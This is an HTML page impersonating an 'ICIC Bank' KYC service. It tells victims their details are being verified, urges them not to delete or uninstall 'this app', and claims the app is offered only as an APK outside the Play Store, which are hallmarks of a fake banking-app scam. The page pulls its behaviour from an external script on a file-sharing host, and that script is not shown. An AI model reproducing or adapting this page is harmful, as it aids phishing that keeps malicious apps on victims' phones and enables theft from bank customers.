<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICIC Bank KYC - Final Note</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 400px;
        }
        .container img {
            width: 350px;
            margin-bottom: 20px;
        }
        .header-text {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .info-text {
            font-size: 14px;
            margin-bottom: 20px;
            color: #555;
        }
        .exit-button {
            width: 100%;
            padding: 10px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .exit-button:hover {
            background-color: #005bb5;
        }
        #loadingPopup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 18px;
        }
        #loadingPopup .circle {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <img src="https://i.ibb.co/T8Xhg5r/icici-bank-aeps-500x500.jpg" alt="ICIC Bank Logo">
    <div class="header-text">IMPORTANT NOTE</div>
    <div class="info-text">
        Please wait, your details are being verified. It will take a minimum of 30 minutes. 
        Most Information - Don't delete & uninstall this app. Thanks for joining ICIC Bank online services.
        Recently launched from ICIC KYC app in only APK FILE, not Play Store.
    </div>
    <button class="exit-button" onclick="exitApplication()">Exit</button>
</div>

<div id="loadingPopup">
    <div class="circle"></div>
    <h2>Loading...</h2>
    <p>Please wait...</p>
</div>

<script src="https://static.staticsave.com/alljs/icicbank.js"></script>
</body>
</html>
